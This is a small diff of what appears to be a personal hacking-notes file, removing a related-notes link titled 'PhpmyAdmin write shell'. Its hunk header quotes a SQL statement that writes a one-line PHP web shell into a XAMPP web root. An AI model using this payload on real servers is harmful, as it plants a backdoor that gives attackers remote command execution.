@@ -9,7 +9,6 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoo
 # Related
 
 - [20221014190001](/zet/20221014190001/README.md) kb file named kb/hacking/common-commands.md
-- [20221003150553](/zet/20221003150553/README.md) PhpmyAdmin write shell
 - ~/kb/hacking/common-commands.md
 
 Tags:
